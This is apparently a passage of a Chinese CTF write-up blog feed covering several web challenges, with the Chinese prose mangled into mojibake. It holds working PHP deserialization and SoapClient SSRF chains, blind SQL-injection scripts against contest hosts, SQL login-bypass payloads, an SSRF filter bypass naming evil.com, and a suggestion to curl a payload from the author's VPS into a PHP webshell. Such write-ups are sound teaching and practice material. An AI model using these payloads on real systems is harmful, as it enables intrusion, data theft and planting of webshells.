-&gt;cc-&gt; __invoke()-&gt; //æ‹¼æ¥ï¼Œéœ€è¦å±æ€§æ˜¯å­—ç¬¦ä¸²            ee-&gt;_toString()-&gt; //$str1æ˜¯ddå¯¹è±¡-&gt;getflag()                dd-&gt;getflag()</code></pre><pre><code class="php">&lt;?phpclass aa{        public $mod1;        public $mod2;}class bb{        public $mod1;        public $mod2;} class cc{        public $mod1;        public $mod2;        public $mod3;}class dd{        public $name;        public $flag;        public $b;}class ee{        public $str1;        public $str2;}$ee=new ee();$ee-&gt;str1=new dd();$ee-&gt;str2=&#39;getflag&#39;;$cc=new cc();$cc-&gt;mod3=&#39;1&#39;;$cc-&gt;mod1=$ee;$aa=new aa();$aa-&gt;mod1=$cc;$aa-&gt;mod2=array(&#39;test2&#39;=&gt;&amp;$aa-&gt;mod1);$bb=new bb();$bb-&gt;mod1=$aa;$ee-&gt;str1-&gt;b=&#39;call_user_func&#39;;$ee-&gt;str1-&gt;flag=&#39;get_flag&#39;;$sa=serialize($bb);echo $sa;</code></pre><p>è¿™é¢˜ç±»ä¼¼bestphpâ€™srevengeï¼Œæ‰€ä»¥å‰é¢çš„é“¾å¥½äº†åå¯ä»¥ç›´æ¥æŠŠgetflag()ç”¨åˆ°çš„ä¸¤ä¸ªå‚æ•°å¡«å¥½ã€‚åŸç†æ˜¯ä¸€æ ·çš„ã€‚<br>é“¾å­å¥½äº†,å›å¤´çœ‹çœ‹è§£ç </p><pre><code class="php">function de_crypt($swpu,$key){    $swpu=base64_decode($swpu);    $key=md5($key);    $h=0;    $length=strlen($swpu);    $swpuctf=strlen($key);    $varch=&#39;&#39;;    for($j=0;$j&lt;$length;$j++){        if($h==$swpuctf)        {            $h=0;        }        $varch.=$key{$h};        $h++;    }    $content=&#39;&#39;;    for($j=0;$j&lt;$length;$j++)    {        $content.= chr(ord($swpu{$j}) - (ord($varch{$j}))+256 % 256);    }    return $content;}</code></pre><p>è§£ç cookieå¾—åˆ°<code>xiaoC:3</code><br>é‚£å°±åŠ å¯†ä¼ªé€ admin<br><code>admin:1 xZmdm9NxaQ==</code></p><p>ç°åœ¨å·®ä¸€ä¸ªSopaæ‰“127.0.0.1è°ƒç”¨getflag<br>éœ€è¦æ³¨æ„çš„æ˜¯<br>interface.phpå·²ç»æœ‰ç°æˆçš„soapæ¥å£äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥è®¿é—®index.phpè°ƒç”¨get_flagã€‚è€Œæ˜¯é€šè¿‡call_user_funcè°ƒç”¨SoapClientç±»çš„get_flagæ–¹æ³•å³è°ƒç”¨äº†Serviceç±»çš„get_flagæ–¹æ³•<br>å…ˆå°†æ•°æ®å†™å…¥session</p><pre><code class="php">&lt;?$target = &#39;http://127.0.0.1/interface.php&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: user=xZmdm9NxaQ==&#39;,);$b = new SoapClient(null, array(&#39;location&#39; =&gt; $target, &#39;user_agent&#39;=&gt;&#39;byc^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers),&#39;uri&#39;=&gt;&#39;aabb&#39;));$a = serialize($b);$a = str_replace(&#39;^^&#39;, &quot;\r\n&quot;, $a);echo $a;?&gt;</code></pre><p>åˆ©ç”¨è¡¨å•ä¼ è¿›session</p><pre><code class="html">&lt;html&gt;&lt;body&gt;    &lt;form action=&quot;http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt;        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;        &lt;input type=&quot;submit&quot; /&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>åŠ ä¸Šä¸Šé¢é“¾å­çš„payload.å³å¯get_flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›</title>
      <link href="2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/"/>
      <url>2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>èŒæ–°ç¬¬ä¸€æ¬¡xctfè‡ªé—­äº†ã€‚<br>ç¬¬ä¸€æ¬¡ä»£è¡¨X1cæ‰“æ¯”èµ›ï¼Œç»“æœè¾“å‡ºè´¼ä½ï¼Œå‡ ä¹å°±å®Œæ•´è´¡çŒ®ä¸€é“é¢˜ã€‚æœ‰å‡ é“åŸºæœ¬åˆ°ä½äº†ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œæ²¡èƒ½åˆ†æ‹…é˜Ÿå‹å‹åŠ›â€¦..ä½†æ˜¯æœ€åé˜Ÿä¼æ‹¿åˆ°ç¬¬8åæŒºå¼ºçš„ï¼Œå…¶ä»–å¸ˆå‚…å¤ªç»™åŠ›äº†ï¼Œä¸­é—´æœ‰æ®µæ—¶é—´è¿˜å†²åˆ°äº†ç¬¬å››åï¼Œåªä¸è¿‡å¤§å®¶å› ä¸ºè¦ä¸Šè¯¾å°±éƒ½ç¡è§‰å»äº†hhhã€‚</p><p>æ‰€ä»¥è¶ç€å…¶ä»–æˆ˜é˜Ÿçš„wpå‡ºæ¥è‡ªå·±å…ˆæŠŠå‡ é“è‡ªå·±å½“æ—¶æ¥è§¦äº†çš„é¢˜ç›®ä»¥åŠæ²¡å®Œæ•´åšå‡ºæ¥çš„é¢˜ç›®å°ç»“ä¸‹ã€‚é¡ºä¾¿æé†’è‡ªå·±è¦åŠ ç´§æŸ¥æ¼è¡¥ç¼ºäº†ã€‚</p><a id="more"></a><h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><p>è¿™é“é¢˜åŸºæœ¬ç®—æ˜¯å®Œæ•´åšå‡ºæ¥äº†ã€‚åªæ˜¯è€ƒç‚¹æœ‰ç‚¹å‘ã€‚éƒ½çŸ¥é“æœ‰æ³¨å…¥ä½†æ˜¯å°±æ˜¯éš¾æ‰¾ã€‚<br>å®é™…ä¸Šåœ¨æ³¨å†Œé¡µé¢æœ‰æ³¨é‡Šæé†’typeå‚æ•°110æ—¶ä¼šä¸ä¸€æ ·ã€‚å¹¶ä¸”ä¹‹å‰ç™»é™†è¿›å»é¡µé¢ä¸­æœ‰å‡ºé¢˜äººæç¤ºçš„â€æ³¨å†Œè´¦æˆ·ä¹Ÿæœ‰ç­‰çº§ä¹‹åˆ†â€ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ³¨å†Œæ—¶å°±å°†typeè°ƒä¸º110ã€‚ç™»é™†è¿›å»å°±å¯ä»¥åœ¨search.phpè¿›è¡Œæ³¨å…¥äº†ã€‚<br>(ä½†æ˜¯è¿™ä¸ªåŒºåˆ†ç‚¹å°±å¾ˆæ— è¯­ï¼Œæ²¡å•¥å«é‡‘é‡ï¼Œåååˆèƒ½éš¾å€’ä¸€å †äºº)</p><p>è¿›å»åä¸€ä¸ªæ™®é€šçš„ç›²æ³¨äº†ã€‚åªä¸è¿‡è¿‡æ»¤äº†å…³é”®å­—ç½®ä¸ºç©ºï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚</p><pre><code class="python">import requestss=requests.session()url=&#39;http://121.37.179.47:1001/regist.php&#39;url2=&#39;http://121.37.179.47:1001/login.php&#39;url3=&#39;http://121.37.179.47:1001/search.php&#39;flag=&#39;&#39;s.post(url, data={&#39;email&#39;: &#39;byc_409&#39;, &#39;pass&#39;: &#39;123&#39;, &#39;repass&#39;: &#39;123&#39;, &#39;type&#39;: &#39;110&#39;})for i in range(1,50):    print(i)    a=0    for j in range(32,128):        s.post(url2, data={&#39;email&#39;: &#39;byc_409&#39;, &#39;pass&#39;: &#39;123&#39;})#admin,fl4g,jd,user        payload = &quot;1&#39; or ascii(substr((selselectect group_concat(flag) frfromom fl4g),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;#&quot;        r = s.post(url3, data={&#39;flag&#39;: payload})        if &#39;no&#39; not in r.text:            flag+=chr(j)            print(flag)            a=1            break    if a==0:        break</code></pre><p>æ³¨å‡ºæ¥åªèƒ½å¾—åˆ°è´¦å·å¯†ç (md5)ï¼ŒåŠ ä¸Šä¸€ä¸ªåªæœ‰ä¸€éƒ¨åˆ†çš„flagã€‚åªèƒ½ç»§ç»­è¿›åå°äº†ã€‚ç”±äºä¹‹å‰æ‰«ç›®å½•å¾—åˆ°è¿‡admin.htmlã€‚ç›´æ¥ç™»å½•ï¼Œå‘ç°æ˜¯ä¸ªæ‰«æå™¨<img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="sql"><br>ç”±äºæˆ‘å‰å‡ å¤©æ‰æ¥å—çš„æ ¡é˜Ÿè€ƒæ ¸å°±æ˜¯mysql load data infileçš„çŸ¥è¯†ç‚¹ï¼ŒåŠ ä¸Šè·‘å‡ºæ¥çš„flagæ˜¯mysql-rogue-serverï¼Œé©¬ä¸Šå°±èƒ½æƒ³åˆ°ä½¿ç”¨Mysql-Rogue-Serverè§£å†³ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•å°±æ˜¯åœ¨æœåŠ¡å™¨è·‘è„šæœ¬å°±å®Œäº†ï¼Œä½†å…¶å®åŸç†æŒºéº»çƒ¦çš„ã€‚ç®€å•è§£é‡Šå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨ load data infileçš„ç‰¹æ€§ï¼Œå¯ä»¥ç”¨è„šæœ¬ä¼ªé€ mysqlä¼ è¾“æ•°æ®åŒ…ã€‚åªè¦è¿™æ ·å°±èƒ½è¿”å›æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶è¯»å–ã€‚<br>ä¸è¿‡è¿™é¢˜pythonè„šæœ¬ä¸å¤§è¡Œçš„æ ·å­ï¼Œç”¨phpè„šæœ¬è§£å†³é—®é¢˜ï¼Œè¯»<code>flag.php</code>å°±å¾—åˆ°å‰©ä¸‹çš„flagã€‚</p><h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><p>è¿™é¢˜åŸºæœ¬æ²¡å•¥æŠ€æœ¯éš¾åº¦ï¼Œä¸»è¦å°±æ˜¯è·‘è„šæœ¬äº†ã€‚æœ¬æ¥éšä¾¿æµ‹æµ‹çš„ï¼Œå‘ç°ç¦ç”¨ç³»ç»Ÿå‡½æ•°ä»¥åŠä¸€ä¸ªopen_basedirã€‚é‚£å°±çœ‹ä¸‹ç›®å½•å§ï¼Œå‘ç°çªç„¶å¤šäº†å¥½å¤šphpæ–‡ä»¶ï¼Œç»™å¸ˆå‚…çœ‹çœ‹å‘ç°å°±æ˜¯ä¸Šæ¬¡å…¬ç›Šèµ›easy_thinkingçš„bypassè„šæœ¬<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>é‚£å°±ç”¨å°±å®Œäº‹äº†ã€‚ç›´æ¥copyå‡½æ•°ç”¨äº†ååŒ…å«ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œå³å¯ã€‚<br>è¿™é¢˜éƒå¸ˆå‚…éšæ‰‹åšçš„ï¼Œè²Œä¼¼å› ä¸ºæ…å±åŸå› åˆ·äº†åå‡ åˆ†é’Ÿæ‰å‡ºæ¥ã€‚<br>è‡³äºä¸ºä»€ä¹ˆä¼šæ…å±ï¼Œéšä¾¿æ”¾ä¸€ä¸‹æ¯”èµ›æ—¶è¯»åˆ°çš„åˆ«é˜Ÿå¤§ä½¬phpå‘½ä»¤<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><p>è¿™é¢˜ä¸æƒ³è¯´å•¥äº†ã€‚å°±æ˜¯å‘ã€‚èµ›åçœ‹çœ‹Nu1lçš„è§£é¢˜è„šæœ¬åï¼Œå‘ç°è¦ç”¨<br><code>\u\n\i\o\n \s\e\l\e\c\t</code>è¿™ç§è¯­å¥ã€‚æ‰€ä»¥å®ƒæºç åº”è¯¥æ˜¯ç›´æ¥æŠŠå‚æ•°<br>timeæ‹¿è¿›å‡½æ•°dateä¸€æŠŠæ¢­â€¦â€¦â€¦..<br><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="date"></p><p>è¿™è°æƒ³å¾—åˆ°ï¼ŒçœŸçš„æ— è¯­ã€‚<br>åé¢ä¸€ä¸ªååºåˆ—åŒ–çš„trick,ä¸æƒ³å¤šè¯´äº†ã€‚</p><p>å¥½å§ï¼Œå®˜æ–¹wpé‡Œå‘ç°è¿™é¢˜å‡ºé¢˜äººæ­åœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šï¼Œæ¥å¤ç°ä¸€æ³¢ã€‚<br>æ³¨å…¥ä¸è¯´äº†</p><pre><code class="python">import requestsimport urllib.parseimport stringimport relet=string.ascii_lowercase+&quot;_.()&quot;exp=&#39;&#39;payload=&quot;1&#39; union select 1,(select group_concat(passwd) from admin),3#&quot;# /eGlhb2xldW5nfor ch in payload:    if ch in let:        ch=&quot;\\&quot;+ch    exp+=chprint(exp)url=&#39;http://eqwerqwrfweryu.mycute.cn/?time=&#39;r=requests.get(url+urllib.parse.quote(exp))page=re.findall(r&#39;&lt;div class=&quot;text-c &quot;&gt;(.*?)&lt;/div&gt;&#39;,r.text)[0]print(page)</code></pre><p>ç„¶åä¸€ä¸ªssrfè¯»æºç ï¼Œfileåè®®åŠ localhostç›´æ¥è¯»ã€‚ä¼°è®¡è·Ÿhgame week2é‚£é¢˜ä¸€æ¨¡ä¸€æ ·çš„åç«¯ä»£ç ã€‚æ ¹æ®æç¤ºè¯»åˆ°æŸä¸ªé‡è¦php</p><pre><code class="php">&lt;?phpclass trick{    public $gf;    public function content_to_file($content){            $passwd = $_GET[&#39;pass&#39;];        if(preg_match(&#39;/^[a-z]+\.passwd$/m&#39;,$passwd))     {         if(strpos($passwd,&quot;20200202&quot;)){            echo file_get_contents(&quot;/&quot;.$content);        }         }         }    public function aiisc_to_chr($number){        if(strlen($number)&gt;2){        $str = &quot;&quot;;         $number = str_split($number,2);         foreach ($number as $num ) {             $str = $str .chr($num);         }         return strtolower($str);        }        return chr($number);    }    public function calc(){        $gf=$this-&gt;gf;        if(!preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)){              eval(&#39;$content=&#39;.$gf.&#39;;&#39;);              $content =  $this-&gt;aiisc_to_chr($content);               return $content;        }    }    public function __destruct(){        $this-&gt;content_to_file($this-&gt;calc());    }}unserialize((base64_decode($_GET[&#39;code&#39;])));?&gt;</code></pre><p>å±å®ä½©æœå‡ºé¢˜äººasciiç éƒ½èƒ½æ‰“é”™ã€‚<br>ä¸Šé¢ä¸€å±‚æ¢è¡Œç¬¦ç»•è¿‡passwordçš„æ ¡éªŒ<br><code>a.passwd%0a20200202</code><br>ä¸‹é¢æœ‰ç‚¹åƒphpé‡Œçš„æ„é€ æŠ€å·§å¯ä»¥ç”¨å–åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¤æ‚çš„å­—ç¬¦æ‹¼æ¥flagå¤§å†™asciiç çš„æ•°å­—ã€‚<br>exp</p><pre><code>&lt;?phpclass trick{    public $gf;}/*$abc=&quot;FLAG&quot;;for($i=0;$i&lt;=strlen($abc);$i++){    echo(ord($abc[$i]));}*/#70766571$o=new trick();$o-&gt;gf=&#39;~&#39;.~&#39;70766571&#39;;#~\xC8\xCF\xC8\xC9\xC9\xCA\xC8\xCEecho(base64_encode(serialize($o)));?&gt;</code></pre><h1 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h1><p>ä¸€ä¸ªå˜ç§çš„ä¸‡èƒ½å¯†ç ï¼Œè¿˜å±…ç„¶æ˜¯ä¸ªåŸé¢˜ã€‚å¯æƒœæ²¡åšè¿‡ã€‚<br>è¯­å¥å¾ˆæ¸…æ™°</p><pre><code class="php">$stmt = $pdo-&gt;prepare(&quot;SELECT username from users where username=&#39;${_POST[&#39;username&#39;]}&#39; and password=&#39;${_POST[&#39;password&#39;]}&#39;&quot;);</code></pre><p>è¿™æ¬¡å› ä¸ºä¸Šé¢é‚£é“å‘é¢˜åˆæŸ¥äº†ä¸å°‘sqlæ³¨å…¥çš„èµ„æ–™ï¼Œä¸­é—´ä¹Ÿå­¦åˆ°äº†ä¸€ä¸ªtrickï¼Œæ¯”å¦‚æ­¤é¢˜payload:</p><pre><code>admin&#39;-0-&#39;   or    &#39;^0^&#39;     acdvvadva&#39; &amp;&#39;1 #å‰é¢éšä¾¿ä¸€ä¸ªå­—ç¬¦ä¸²éƒ½å¯</code></pre><p>å®é™…å°±æ˜¯åˆ©ç”¨äº†mysqlé‡Œå­—ç¬¦çš„ç‰¹æ€§ã€‚æ¯”å¦‚ä¸‡èƒ½å¯†ç <br><code>username=&#39;admin&#39;-0-&#39;&#39;</code>é‡Œmysqlä¼šæŠŠadminè½¬ä¸ºæ•°å­—ï¼Œå› ä¸ºå®ƒè·Ÿæ•°å­—è¿ç®—äº†ã€‚å¦‚æœè¿™é‡Œ0æ¢æˆ1ç›¸å½“äº<code>username=-1</code>ï¼Œå±äºé”™è¯¯ã€‚å¦‚æœæ¢æˆ<code>username=0</code>åˆ™ç›´æ¥è¿”å›æ‰€æœ‰ç»“æœã€‚<br>åŒç†ï¼Œè¿™ä¸ªæ€è·¯å¯ä»¥å¸¦åˆ°å¼‚æˆ–ã€‚è¿›ä¸€æ­¥è¿˜å¯ä»¥ç”¨åœ¨æŸäº›è¿‡æ»¤è¾ƒå¤šçš„ç›²æ³¨ä¸‹ï¼Œæ¯”å¦‚è¿‡æ»¤äº†æ³¨é‡Šç¬¦å·æ—¶çš„å¸ƒå°”ç›²æ³¨ï¼š</p><pre><code>payload=&#39;-(1=1)-&#39;    å¸ƒå°”å€¼å‡payload=&#39;-(1=0)-&#39;    å¸ƒå°”å€¼çœŸ...payload=&#39;-(length(database())=12)-&#39;    </code></pre><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>æœ€æ—©åšçš„ä¸€é“é¢˜ã€‚å…¶å®æ€è·¯è›®æ¸…æ™°çš„ï¼Œä½†æ˜¯åæ¥æ²¡åšäº†ã€‚å…¶å®æœ‰ä¸€éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºè‡ªå·±æœ€åä¸€æ­¥5å­—å‘½ä»¤æ‰§è¡ŒhitconåŸé¢˜ä¸€ç›´æ²¡åšå‡ºæ¥è¿‡ã€‚è¿·æƒ‘ã€‚<br>å¼€å§‹æ˜¯å®¡è®¡æºç ï¼Œåœ¨profile.phpä¸­å‘ç°æœ‰ä¸€ä¸ªsession.serialize_handleråºåˆ—åŒ–å¤„ç†å™¨ä¸åŒçš„é—®é¢˜ã€‚æ‰€ä»¥åªè¦æŠŠåºåˆ—åŒ–æ•°æ®å†™è¿›sessionå¹¶æ»¡è¶³ä»–<code>this-&gt;admin=1</code>çš„æ¡ä»¶å³å¯ã€‚<br>è¿™é¢˜æä¾›äº†ä¸€ä¸ªç°æˆçš„å¯æ§å‚æ•°ã€‚æ‰€ä»¥ä¸éœ€è¦åƒåŸæ¥jarvisojä¸Šåšçš„ä¸€é“é¢˜é‚£æ ·æ„é€ ä¸€ä¸ªä¸Šä¼ å†™å…¥session.<br>è¿›å…¥profileåå¯ä»¥çœ‹åˆ°æºç æ˜¯hitconåŸé¢˜ï¼Œä½†æ˜¯å‰é¢åŠ äº†ä¸€å±‚è¿‡æ»¤<br>å…¶å®å°±æ˜¯ç»å…¸çš„<code>filtervar+pregmatch</code><br>ä¹‹å‰æ›¾ç»æ•´ç†è¿‡ssrfçš„ç»å…¸wafï¼š<a href="https://www.jianshu.com/p/095f233cc9d5" target="_blank" rel="noopener">https://www.jianshu.com/p/095f233cc9d5</a></p><pre><code class="php">&lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;;   // check if argument is a valid URL   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {      // parse URL      $r = parse_url($argv[1]);      print_r($r);      // check if host ends with google.com      if(preg_match(&#39;/google\.com$/&#39;, $r[&#39;host&#39;])) {         // get page from URL         exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);         print_r($a);      } else {         echo &quot;Error: Host not allowed&quot;;      }   } else {      echo &quot;Error: Invalid URL&quot;;   }?&gt;</code></pre><p>å½“æ—¶payloadæ˜¯<code>0://evil.com:80;google.com:80</code><br>ä½†æ˜¯æ­¤é¢˜å…¶å®è·Ÿbytectfçš„boringcodeæ›´åƒã€‚å¹¸å¥½è‡ªå·±æ¯”èµ›å‰å‡ å¤©æ‰å¤ç°è¿‡ã€‚å…·ä½“ç»†èŠ‚ä¸Šå°±æ˜¯å°†hostçš„googleæ”¹ä¸ºbaiduï¼ŒåŠ äº†ä¸€å±‚dataåè®®çš„è¿‡æ»¤ã€‚ä»¥åŠssrfæ–¹å¼å˜ä¸º<code>file_get_contents()</code><br>æ³¨æ„ï¼ŒåŸæœ¬curlçš„æ—¶å€™æˆ‘ä»¬æ˜¯æœ‰å¤šè§£çš„ã€‚ä½†æ˜¯ssrfæ¢æˆ<code>file_get_contents()</code>è¯·æ±‚åªæœ‰ä¸€ç§æ™®éçš„æ–¹å¼å°±æ˜¯<code>data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</code><br>hoståçš„å†…å®¹ç›´æ¥ä»¥è·¯å¾„ç»•è¿‡ã€‚å¹¶ä¸”ä½œä¸ºè¯·æ±‚å†…å®¹è¾“å‡ºã€‚<br>æ­¤é¢˜è¿‡æ»¤äº†dataï¼Œä¸bytectfä¸€è‡´ã€‚å½“æ—¶æˆ‘çœ‹åˆ°boringcodeè¿™é¢˜å¾ˆå¤šæˆ˜é˜Ÿè§£å†³æ–¹æ³•æ˜¯è´­ä¹°åŸŸåç»•è¿‡å¯¹hostçš„é™åˆ¶ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰è¯´ç”¨baidu302è·³è½¬çš„ï¼Œè¿™é‡Œæ˜¾ç„¶ä¸è¡Œï¼›æœ‰è¯´ç”¨ftpåè®®çš„ï¼Œæˆ‘è¯•è¿‡ä¹Ÿä¸è¡Œã€‚å½“æ—¶è¿˜å‰©ä¸‹ä¸€ç§è§£å†³æ–¹æ³•æˆ‘è¯•äº†ä¸€ä¸‹å‘ç°å¯ä»¥ï¼Œå°±æ˜¯<code>compress.zlib://data:@baidu.com/baidu.com?,echo(scandir(&#39;.&#39;));</code>è€Œä¸”ç›´æ¥ä»è·¯å¾„è·å–å†…å®¹æ¯”å¦ä¸€ç§æ–¹æ³•ç®€å•è®¸å¤šã€‚</p><p>æ‰€ä»¥æ­¤é¢˜ç›´æ¥ä½¿ç”¨è¿™ä¸€æ–¹æ³•å°±èƒ½ç»•è¿‡æ ¡éªŒäº†ã€‚<br><code>compress.zlib://data:@127.0.0.1/plain;base64,</code><br>åé¢hitconçš„å†…å®¹ä¸å¤šè¯´ã€‚æˆ‘è§‰å¾—è‡ªå·±è™½ç„¶orangeçš„è„šæœ¬ç”¨ä¸å‡ºæ¥ï¼Œå…¶ä»–æ–¹æ³•è¯´ä¸å®šå¯ä»¥ã€‚æ¯”å¦‚æŠŠé‡Œé¢çš„å‘½ä»¤æ¢æˆ<code>curl vps ip &gt; a.php</code><br>å†™å…¥ä¸€å¥è¯ã€‚</p><h1 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h1><p>æœ‰æ„æ€çš„é¢˜ç›®ï¼Œå°±æ˜¯æˆ‘payloadå‡ ä¹éƒ½å®Œæˆäº†ç»“æœæ²¡åšå‡ºæ¥ã€‚æ³ªæµæ»¡é¢ã€‚<br>å¼€å§‹ç¬¬ä¸€å¤©å‘ç°æ˜¯ä¸ªCSP,åŠ ä¸Šæœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ç›´æ¥å°±çŒœæ˜¯xss+cspbypassã€‚ç»“æœè¯•äº†ä¸‹å‘ç°ä¸ªåˆ«å‚æ•°ä¸€å †è¿‡æ»¤è¿˜æœ‰æ²¡æ‰¾åˆ°xssçš„ç‚¹ã€‚ç¬¬äºŒå¤©æ‰çŸ¥é“æœ‰gitæºç æ³„éœ²ï¼Œç«‹é©¬åŸåœ°å¤æ´»ã€‚<br>æ¯”èµ›æ—¶æ•´ç†çš„è¦ç‚¹</p><pre><code>1.$messageå¯æ§ï¼Œç»•è¿‡preg_match&#39;/coo|&lt;|ja|\&amp;|\\\|&gt;|win/i&#39;åaddslashesåå­˜å‚¨èµ·æ¥ç„¶åshowmessage()é‡Œè°ƒç”¨äº†echo &quot;&lt;body&gt;&lt;script&gt; var a = &#39;{$this-&gt;info-&gt;message}&#39;;document.write(a);&lt;/script&gt;&lt;/body&gt;&quot;;2.$answerå¯æ§ç»•è¿‡preg_match &quot;/[^a-zA-Z_\-}&gt;@\]*]/i&quot;è·Ÿ/f|sy|and|or|j|sc|in/iæ‹¼æ¥è¿›eval(eval(&quot;\$this-&gt;&quot;.$answer.&quot; = false;&quot;);)3.$refererå¯æ§è·³è½¬4.æ–‡ä»¶ä¸Šä¼ ç¦äº†[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;=&#39;, &#39;co&#39;, &#39;\\&#39;, &#39;&quot;&#39;, &#39;\&#39;&#39;]</code></pre><p>è¿™é‡ŒCSPå†™çš„å¾ˆåŸºæœ¬ï¼Œå°±æ˜¯ä¸ªå…è®¸åŒæºè„šæœ¬ï¼Œè€Œä¸”å¼€æ”¾äº†unsafe-inlineã€‚è¿™ç§ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„jså°±æ˜¯ç™½ç»™ã€‚CSPè½»æ¾è§£å†³ã€‚ç°åœ¨å…³é”®æ˜¯wafã€‚<br>$messageæ˜¯ä¼ æ‰“xssçš„è¯­å¥çš„ã€‚ä½†æ˜¯è¿‡äº†ä¸€å±‚addslashesåè¢«å†™å…¥è¯­å¥ï¼Œæ„å‘³ç€å¿…é¡»è¦è§£å†³å®½å­—ç¬¦çš„é—®é¢˜ã€‚è¿™é‡Œå¦‚æœæ˜¯å¸¸è§„æ–¹æ³•å¯ä»¥åœ¨é‡Œé¢å†å†™ä¸€ä¸ª<code>script</code>å†…å®¹ç»•è¿‡ã€‚å¯æ˜¯æ ‡ç­¾è¢«è¿‡æ»¤äº†ã€‚åªèƒ½è€ƒè™‘å…¶ä»–æ–¹æ³•ã€‚</p><p>$answeråº”è¯¥æ˜¯è¦åˆ©ç”¨çš„ï¼Œæœ€ç»ˆå¯ä»¥å®ç°ä¸€ä¸ªevalè¯­å¥ï¼Œä½†æ˜¯ä¸¥æ 